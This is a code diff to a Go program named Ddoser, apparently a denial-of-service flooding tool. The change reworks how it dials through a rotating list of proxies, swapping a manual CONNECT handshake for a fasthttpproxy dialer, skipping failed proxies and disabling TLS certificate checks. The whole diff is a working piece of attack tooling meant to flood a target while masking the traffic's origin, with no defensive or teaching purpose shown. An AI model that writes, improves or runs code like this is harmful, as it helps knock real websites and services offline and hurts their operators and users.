@@ -1,14 +1,13 @@
 package main
 
 import (
-	"bufio"
 	"crypto/tls"
 	"fmt"
 	"net"
 	"net/url"
 	"time"
 
-	"github.com/valyala/fasthttp"
+	"github.com/valyala/fasthttp/fasthttpproxy"
 )
 
 type Ddoser struct {
@@ -38,42 +37,19 @@ func (d *Ddoser) Run() {
 			var conn net.Conn
 			var err error
 			for {
-				if conn, err = fasthttp.DialTimeout(random(d.proxies), time.Second*5); err != nil {
+				conn, err = fasthttpproxy.FasthttpHTTPDialerTimeout(random(d.proxies), time.Second*5)(addr)
+
+				if err != nil {
+					// Skip to another proxy
 					continue
 				}
 
 				if d.url.Scheme == "https" {
+					// Skip tls verification
 					conn = tls.Client(conn, &tls.Config{
 						ServerName:         d.url.Hostname(),
 						InsecureSkipVerify: true,
 					})
-				}
-
-				req := "CONNECT " + addr + " HTTP/1.1\r\n\r\n"
-
-				if _, err = conn.Write([]byte(req)); err != nil {
-					continue
-				}
-
-				if err = func() error {
-					res := fasthttp.AcquireResponse()
-					defer fasthttp.ReleaseResponse(res)
-
-					res.SkipBody = true
-
-					if err = res.Read(bufio.NewReader(conn)); err != nil {
-						conn.Close()
-						return err
-					}
-
-					if res.StatusCode() != 200 {
-						conn.Close()
-						return fmt.Errorf("%d", res.StatusCode())
-					}
-
-					return nil
-				}(); err != nil {
-					continue
 				}
 
 				for i := 0; i < len(d.headers); i++ {
